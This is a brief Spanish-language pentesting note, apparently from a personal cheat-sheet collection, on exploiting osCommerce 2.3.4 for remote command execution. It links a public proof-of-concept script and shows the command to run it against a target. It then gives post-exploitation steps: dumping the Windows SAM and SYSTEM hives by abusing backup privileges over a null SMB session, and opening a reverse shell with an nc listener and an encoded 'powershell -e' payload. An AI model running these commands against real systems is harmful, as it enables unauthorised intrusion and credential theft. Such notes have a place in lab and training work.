# osCommerce 

Tags: #Windows 

## Versión 2.3.4 - RCE 

* [PoC](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py)

```bash 
# Ejecutar para obtener un RCE directo 
❯ python3 osCommerce.py http://IP:8080/oscommerce-2.3.4/catalog   


NOTA:
	- La consola que entrega esta limitada 
```

```bash 
Formas:
1. Si el usuario en la consola que nos entrega el PoC tiene privilegios de 'SeBackupPrivilege y SeRestorePrivilege' se puede descargar la 'SAM y SYSTEM' colocando una ruta a la que se tenga acceso para descargar los archivos. Por ejemplo que se tenga acceso al SMB con sesión nula al dir 'C:\Users\Public'


2. La segunda forma es generar una revershell más completa de la siguiente manera: 
# Revershell desde la consola limitada 
- Paso 1:
# Obtener el código de una 'powershell #3 (Base64)' desde la página 'Revershell Generator' 

- Paso 2:
❯ rlwrap nc -nlvp 4444

- Paso 3:
# Pegar el payload en la shell limitada y ejecutar la revershell 
❯ powershell -e JABjAGwAaQBlAG4AdA....
```